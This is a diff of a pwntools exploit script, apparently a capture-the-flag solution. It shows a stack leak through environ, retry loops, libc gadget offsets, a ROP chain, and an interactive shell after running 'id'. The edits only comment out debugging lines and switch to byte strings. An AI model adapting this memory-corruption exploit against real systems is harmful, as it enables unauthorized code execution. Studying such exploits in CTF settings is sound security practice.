@@ -117,7 +117,7 @@ leak_asm = assembler(leak)
 p.sendlineafter(b">>", b"1")
 p.sendlineafter(b": ", str(len(leak_asm)).encode())
 
-gdb.attach(p)
+# gdb.attach(p)
 p.send(leak_asm)
 sleep(0.1)
 
@@ -190,13 +190,13 @@ sleep(0.1)
 while True:
     p.send(p64(environ))
     data = p.recvn(8)
-    print (hexdump(data))
+    # print (hexdump(data))
     
     if data == p64(environ):
-        p.sendline("") # fail
+        p.sendline(b"") # fail
         continue
     else:
-        p.sendline("y") # success
+        p.sendline(b"y") # success
         break
 
 stack_leak = u64(data)
@@ -268,13 +268,13 @@ print("rop", hex(addr_ret))
 while True:
     p.send(p64(addr_ret))
     data = p.recvn(8)
-    print (hexdump(data))
+    # print (hexdump(data))
     
     if data == p64(addr_ret):
-        p.sendline("") # fail
+        p.sendline(b"") # fail
         continue
     else:
-        p.sendline("y") # success
+        p.sendline(b"y") # success
         break
 
 rdi_ret = libc_base + 0x2a3e5
@@ -289,5 +289,5 @@ p.sendline(b''.join([
 ]))
 
 sleep(0.1)
-p.sendline("id")
+p.sendline(b"id")
 p.interactive()
